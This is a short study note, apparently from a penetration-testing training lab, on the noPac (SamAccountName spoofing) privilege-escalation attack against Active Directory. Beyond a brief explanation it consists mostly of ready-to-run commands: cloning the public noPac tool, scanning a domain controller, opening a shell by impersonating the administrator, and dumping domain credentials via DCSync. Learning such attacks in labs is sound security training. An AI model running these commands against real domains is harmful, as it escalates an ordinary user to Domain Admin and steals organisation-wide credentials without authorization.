> **Attack explaination**:
> The attack allows intra-domain privilege escalation from standard domain user to Domain Admin level access
> 
> We change the `SamAccountName` of a computer account to match a Domain Controller's `SamAccountName`.
> 
> Needs current pwned account to be able to add 10 computer accounts to the domain

## uhh

```sh
git clone https://github.com/Ridter/noPac.git
cd ./noPAC
```

### Scan

```sh
sudo python3 scanner.py "$domain/$user:$pass" -dc-ip $target -use-ldap
```

### Run

```sh
sudo python3 noPac.py "$domain/$user:$pass" -dc-ip $target  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

> If we `ls` current directory, we can also see the kerberos ticket too.

### DCSync

```sh
sudo python3 noPac.py "$domain/$user:$pass" -dc-ip $target  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump
```